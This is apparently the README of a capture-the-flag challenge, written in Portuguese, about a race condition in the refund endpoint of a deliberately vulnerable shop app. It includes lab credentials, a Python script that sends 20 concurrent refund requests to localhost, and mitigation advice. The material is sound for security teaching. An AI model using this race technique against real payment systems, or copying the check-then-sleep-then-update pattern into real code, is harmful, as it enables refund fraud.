# CTF Challenge - Race Condition in Refund System

Este é um desafio CTF focado em explorar uma vulnerabilidade de **Race Condition** no sistema de reembolso.

## Descrição

A aplicação é uma loja online simples com sistema de autenticação, compra de itens e reembolso. O objetivo é encontrar e explorar a vulnerabilidade de race condition para obter a flag.

## Objetivo

A flag é exibida quando o saldo do usuário atinge **$10,000 ou mais**.

## Como Executar

```bash
# Construir e iniciar os containers
docker-compose up --build

# A aplicação estará disponível em http://localhost:8080
```

## Contas de Teste

- **Username:** `user` | **Password:** `user123`
- **Username:** `guest` | **Password:** `guest123`

## Estrutura

- `/login` - Página de login
- `/home` - Página inicial (mostra flag se saldo >= $10,000)
- `/shop` - Loja para comprar itens
- `/orders` - Lista de pedidos e opção de reembolso
- `/refund` - Endpoint de reembolso (vulnerável!)

## A Vulnerabilidade

O endpoint `/refund` é vulnerável a race condition porque:

1. Verifica se o pedido já foi reembolsado
2. Há um pequeno delay (`time.sleep(0.1)`)
3. Atualiza o saldo e marca como reembolsado

**O problema:** Entre a verificação e o update, múltiplas requisições simultâneas podem passar pela verificação e todas processarem o reembolso, resultando em múltiplos créditos para o mesmo pedido.

## Exploração

Para explorar a vulnerabilidade:

1. Faça login
2. Compre um item caro (ex: "Expensive Item" por $500)
3. Vá para "My Orders"
4. Dispare múltiplas requisições simultâneas para o endpoint `/refund` com o mesmo `order_id`
5. Continue até atingir $10,000+ e obter a flag

### Script de Exploração Exemplo

```python
import requests
import threading

def request_refund(session, order_id, url):
    """Faz requisição de reembolso"""
    response = session.post(url + '/refund', data={'order_id': order_id})
    print(response.json())

# Login
session = requests.Session()
login_data = {'username': 'user', 'password': 'user123'}
session.post('http://localhost:8080/login', data=login_data)

# Obter order_id (substitua pelo ID real do pedido)
order_id = 1
url = 'http://localhost:8080'

# Disparar múltiplas requisições simultâneas
threads = []
for i in range(20):  # 20 requisições em paralelo
    t = threading.Thread(target=request_refund, args=(session, order_id, url))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

## Mitigação

A vulnerabilidade pode ser corrigida usando:

1. **Transações atômicas** com locks:
```sql
START TRANSACTION;
SELECT ... FOR UPDATE;
-- verificar e atualizar
COMMIT;
```

2. **UPDATE condicional**:
```sql
UPDATE orders SET refunded = 1 
WHERE id = %s AND refunded = 0;
-- Verificar se alguma linha foi afetada
```

3. **Unique constraint** ou **optimistic locking** com versão

